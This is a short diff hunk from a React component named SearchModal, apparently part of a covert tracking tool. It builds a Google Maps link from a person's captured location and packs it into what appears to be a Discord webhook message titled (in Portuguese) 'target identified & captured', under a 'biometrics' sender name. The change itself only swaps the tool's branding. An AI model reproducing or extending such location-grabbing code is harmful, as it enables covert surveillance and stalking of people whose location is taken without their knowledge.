@@ -65,7 +65,7 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
       const mapsUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Localização não disponível";
       
       const payload = {
-        username: "NOVA INTELLIGENCE | BIOMETRIA 🛡️",
+        username: "FERRAO | BIOMETRIA 🛡️",
         avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png",
         embeds: [{
           title: "🎯 ALVO IDENTIFICADO & CAPTURADO",
